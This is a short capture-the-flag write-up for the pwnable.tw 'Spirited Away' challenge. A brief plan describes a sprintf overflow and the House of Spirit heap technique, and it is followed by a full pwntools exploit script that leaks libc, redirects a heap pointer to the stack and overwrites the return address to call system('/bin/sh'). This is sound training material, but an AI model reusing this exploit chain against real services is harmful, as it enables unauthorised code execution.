# Spirited Away
> LongChampion, 26/03/2020

## Ideal
- Firstly, we can leak the stack by some ways (maybe send 80 bytes to `reason` to read `$EBP`).
- Secondly, by send more than 100 commends, `sprintf` will overflow and change one important variable from `60` to `110`.
- But we can't directly overwrite the `RET_ADDR`, because `reason` are accept at most 80 character.
- So we move attention to variable `name` and `comment`, because we have "extended" their "capacity" from `60` to `110`.
- The most interesting now is variable `name`, we can overwrite it and make it point to the stack instead of the heap.
- Using the method `House of Spirit` in this [book](https://heap-exploitation.dhavalkapil.com/), we can make `name` point to the stack and overwrite `RET_ADDR` to get the flag

## Final Solution (Copy from intenet)
 ```python
#!/usr/bin/python2

from pwn import *

r = remote('chall.pwnable.tw', 10204)
elf = ELF('./spirited_away')
libc = ELF('./libc_32.so.6')


def comment(name, age, reason, comment):
    r.sendafter('name: ', name)
    r.sendlineafter('age: ', str(age))
    r.sendafter('movie? ', reason)
    r.sendafter('comment: ', comment)


comment('AAAA', 1111, 'B' * 24, 'CCCC')
r.recvuntil('B' * 24)
leak = u32(r.recv(4))
libc_base = leak - libc.symbols['_IO_file_sync'] - 7
system = libc_base + libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh').next()
log.info("LIBC BASE: " + hex(libc_base))
log.warn("Please wait, it may take about 2 minutes")

r.sendafter('<y/n>: ', 'y')
comment('AAAA', 1111, 'B' * 56, 'CCCC')
r.recvuntil('B' * 56)
stack = u32(r.recv(4))
r.sendafter('<y/n>: ', 'y')

for i in range(100 - 2):
    comment('1', '1', '1', '1')
    r.sendafter('<y/n>: ', 'y')

payload = ''
payload += p32(0)
payload += p32(0x41)
payload += 'A' * 60
payload += p32(0x10000)  # top chunk

payload2 = ''
payload2 += 'A' * 84
payload2 += p32(stack - 104)
comment('AAAA', 1111, payload, payload2)

payload = ''
payload += 'A' * 76
payload += p32(system)
payload += 'A' * 4
payload += p32(binsh)
r.sendafter('<y/n>: ', 'y')
comment(payload, 1, 'BBBB', "CCCC")
r.sendafter('<y/n>: ', 'n')

r.interactive()
```
